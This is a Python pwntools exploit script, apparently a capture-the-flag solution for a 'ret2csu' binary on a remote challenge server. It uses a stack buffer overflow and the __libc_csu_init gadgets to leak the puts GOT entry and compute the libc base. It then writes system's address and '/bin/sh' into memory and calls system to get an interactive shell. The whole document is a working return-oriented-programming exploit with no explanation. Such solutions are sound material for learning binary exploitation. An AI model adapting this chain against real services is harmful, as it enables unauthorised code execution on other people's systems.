from pwn import *
context.log_level="debug"

r=remote("pwn.sixstars.team",23611)
#r=process("./ret2csu")
elf=ELF("./ret2csu")
libc=ELF("./libc-2.23.so")

puts_p=elf.got["puts"]
puts_addr=libc.sym["puts"]
exeve=libc.sym["system"]

csu1=0x4007A0

r.recv()
sh1='a'*0x18+p64(0x4007BA)+p64(0)+p64(1)+p64(puts_p)+p64(0)+p64(0)+p64(puts_p)+p64(csu1)+p64(0)*0x7+p64(0x4006F0)
r.send(sh1)
#r.recvline()
r.recvline()
s=r.recv(6)
s=s+'\x00'+'\x00'
libc.address=u64(s)-puts_addr
print "libc:"+hex(libc.address)

real_exe=libc.sym['system']
real_sh=list(libc.search("/bin/sh"))[0]
read_addr=elf.got["read"]


r.recv()
sh2='a'*0x18+p64(0x4007BA)+p64(0)+p64(1)+p64(read_addr)+p64(16)+p64(0x601800)+p64(0)+p64(csu1)+p64(0)*0x7+p64(0x4006F0)
r.send(sh2)
r.send(p64(real_exe)+'/bin/sh\x00')
#print r.pid
#pause()
r.recv()
sh3='a'*0x18+p64(0x4007BA)+p64(0)+p64(1)+p64(0x601800)+p64(0)+p64(0)+p64(0x601808)+p64(csu1)
r.sendline(sh3)

r.interactive()
